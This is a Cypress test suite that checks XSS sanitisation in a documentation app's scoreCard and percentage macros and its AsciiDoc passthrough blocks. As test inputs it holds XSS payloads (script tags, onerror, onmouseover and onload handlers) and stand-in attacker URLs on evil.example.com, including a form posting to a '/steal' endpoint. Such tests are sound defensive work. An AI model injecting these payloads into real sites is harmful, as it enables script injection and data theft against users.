/// <reference types="cypress" />

const createPageCard = () => {
  cy.get('[data-cy="createNewButton"]').click();
  cy.get('.templateCard').contains('Page').click();
  cy.get('[data-cy="confirmCreateButton"]').click();
  cy.get('[role="presentation"]').contains('Card created successfully');
  cy.get('[data-cy="notificationClose"]').click();
  cy.get('[role="presentation"]')
    .contains('Card created successfully')
    .should('not.exist');
};

const patchCardContent = (content: string) => {
  cy.url().then((url) => {
    const cardKey = url.split('/cards/')[1];
    const projectPrefix = url.split('/projects/')[1].split('/')[0];
    cy.request('PATCH', `/api/projects/${projectPrefix}/cards/${cardKey}`, {
      content,
    });
    cy.visit(`/projects/${projectPrefix}/cards/${cardKey}`);
  });
};

const scoreCardContent = (overrides: {
  title?: string;
  value?: number;
  unit?: string;
  legend?: string;
}) => {
  const {
    title = 'Safe title',
    value = 30,
    unit = '%',
    legend = 'Safe legend',
  } = overrides;
  return `{{#scoreCard}}"title": "${title}","value": ${value},"unit": "${unit}","legend": "${legend}"{{/scoreCard}}`;
};

const percentageContent = (overrides: {
  title?: string;
  value?: number;
  legend?: string;
  colour?: string;
}) => {
  const {
    title = 'Safe title',
    value = 50,
    legend = 'Safe legend',
    colour = 'blue',
  } = overrides;
  return `{{#percentage}}"title": "${title}","value": ${value},"legend": "${legend}","colour": "${colour}"{{/percentage}}`;
};

const passthroughContent = (html: string) => `++++\n${html}\n++++`;

describe('XSS Prevention', () => {
  Cypress.config('defaultCommandTimeout', 20000);

  beforeEach(() => {
    cy.visit('');
    // This is a bit anti-pattern, but the tests are attempting to throw an alert by modifying content
    // If they are able to, error is thrown and the tests fail. This means they are vulnerable to XSS
    cy.on('window:alert', () => {
      throw new Error('XSS: window.alert was called');
    });
  });

  describe('ScoreCard macro', () => {
    it('sanitizes script tag in title', () => {
      createPageCard();
      patchCardContent(
        scoreCardContent({ title: '<script>alert(1)</script>' }),
      );
      cy.get('.doc script').should('not.exist');
      cy.get('.doc .card').should('exist');
    });

    it('sanitizes img onerror in title', () => {
      createPageCard();
      patchCardContent(
        scoreCardContent({ title: '<img src=x onerror=alert(1)>' }),
      );
      cy.get('.doc [onerror]').should('not.exist');
      cy.get('.doc .card').should('exist');
    });

    it('sanitizes script tag in unit', () => {
      createPageCard();
      patchCardContent(scoreCardContent({ unit: '<script>alert(1)</script>' }));
      cy.get('.doc script').should('not.exist');
      cy.get('.doc').contains('Safe title');
      cy.get('.doc').contains('Safe legend');
    });

    it('sanitizes script tag in legend', () => {
      createPageCard();
      patchCardContent(
        scoreCardContent({ legend: '<script>alert(1)</script>' }),
      );
      cy.get('.doc script').should('not.exist');
      cy.get('.doc').contains('Safe title');
    });
  });

  describe('Percentage macro', () => {
    it('sanitizes script tag in title', () => {
      createPageCard();
      patchCardContent(
        percentageContent({ title: '<script>alert(1)</script>' }),
      );
      cy.get('.doc script').should('not.exist');
      cy.get('.doc svg').should('exist');
      cy.get('.doc').contains('Safe legend');
    });

    it('sanitizes script tag in legend', () => {
      createPageCard();
      patchCardContent(
        percentageContent({ legend: '<script>alert(1)</script>' }),
      );
      cy.get('.doc script').should('not.exist');
      cy.get('.doc svg').should('exist');
      cy.get('.doc').contains('Safe title');
    });
  });

  describe('Content-level XSS via AsciiDoc passthrough', () => {
    it('sanitizes script tag in passthrough block', () => {
      createPageCard();
      patchCardContent(
        passthroughContent('<script>alert("xss")</script><p>Safe</p>'),
      );
      cy.get('.doc script').should('not.exist');
      cy.get('.doc').contains('Safe');
    });

    it('sanitizes event handler in passthrough block', () => {
      createPageCard();
      patchCardContent(
        passthroughContent('<div onmouseover="alert(1)">Hover</div>'),
      );
      cy.get('.doc [onmouseover]').should('not.exist');
      cy.get('.doc').contains('Hover');
    });

    it('sanitizes SVG onload in passthrough block', () => {
      createPageCard();
      patchCardContent(
        passthroughContent('<svg onload="alert(1)"><circle r="40"/></svg>'),
      );
      cy.get('.doc [onload]').should('not.exist');
    });

    it('sandboxes iframe in passthrough block', () => {
      createPageCard();
      patchCardContent(
        passthroughContent(
          '<iframe src="https://evil.example.com"></iframe><p>Safe</p>',
        ),
      );
      cy.get('.doc iframe')
        .should('exist')
        .and('have.attr', 'sandbox', 'allow-scripts allow-same-origin');
      cy.get('.doc').contains('Safe');
    });

    it('strips object tag in passthrough block', () => {
      createPageCard();
      patchCardContent(
        passthroughContent(
          '<object data="https://evil.example.com/mal.swf"></object><p>Safe</p>',
        ),
      );
      cy.get('.doc object').should('not.exist');
      cy.get('.doc').contains('Safe');
    });

    it('strips embed tag in passthrough block', () => {
      createPageCard();
      patchCardContent(
        passthroughContent(
          '<embed src="https://evil.example.com/mal.swf"><p>Safe</p>',
        ),
      );
      cy.get('.doc embed').should('not.exist');
      cy.get('.doc').contains('Safe');
    });

    it('strips form action in passthrough block', () => {
      createPageCard();
      patchCardContent(
        passthroughContent(
          '<form action="https://evil.example.com/steal"><input value="data"></form><p>Safe</p>',
        ),
      );
      cy.get('.doc form').should('not.exist');
      cy.get('.doc').contains('Safe');
    });
  });

  describe('Allowed HTML elements via passthrough', () => {
    it('renders details/summary elements', () => {
      createPageCard();
      patchCardContent(
        passthroughContent(
          '<details><summary>Toggle title</summary><p>Hidden content</p></details>',
        ),
      );
      cy.get('.doc details').should('exist');
      cy.get('.doc summary').should('exist').and('contain', 'Toggle title');
      // details should be interactive — click to open
      cy.get('.doc details summary').click();
      cy.get('.doc details').contains('Hidden content');
    });

    it('renders video element', () => {
      createPageCard();
      patchCardContent(
        passthroughContent(
          '<video controls><source src="test.mp4" type="video/mp4"></video>',
        ),
      );
      cy.get('.doc video').should('exist').and('have.attr', 'controls');
      cy.get('.doc video source')
        .should('exist')
        .and('have.attr', 'src', 'test.mp4');
    });

    it('renders iframe with forced sandbox attribute', () => {
      createPageCard();
      patchCardContent(
        passthroughContent(
          '<iframe src="https://www.youtube.com/embed/test" allowfullscreen></iframe>',
        ),
      );
      cy.get('.doc iframe')
        .should('exist')
        .and('have.attr', 'src', 'https://www.youtube.com/embed/test')
        .and('have.attr', 'sandbox', 'allow-scripts allow-same-origin');
    });
  });
});
